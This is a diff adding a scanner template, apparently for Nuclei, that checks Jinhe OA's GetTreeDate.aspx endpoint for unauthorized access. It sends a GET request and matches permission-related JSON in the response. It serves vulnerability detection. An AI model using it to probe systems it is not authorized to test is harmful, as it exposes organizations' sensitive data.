@@ -1,0 +1,29 @@
+id: poc-yaml-jh-OA-GetTreeDate-unauthorized-access
+
+info:
+  name: Jinhe OA GetTreeDate.aspx Unauthorized Access Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: unauthorized-access
+  description: |
+    This template checks for unauthorized access to the GetTreeDate.aspx endpoint in Jinhe OA, which could potentially expose sensitive data.
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/C6/Jhsoft.Web.users/GetTreeDate.aspx/?id=1"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '"permissions":true'
+          - 'GetTreeDate.aspx?nodeid='
+          - '"checkstate"'
+      - type: word
+        part: header
+        words:
+          - "application/json"
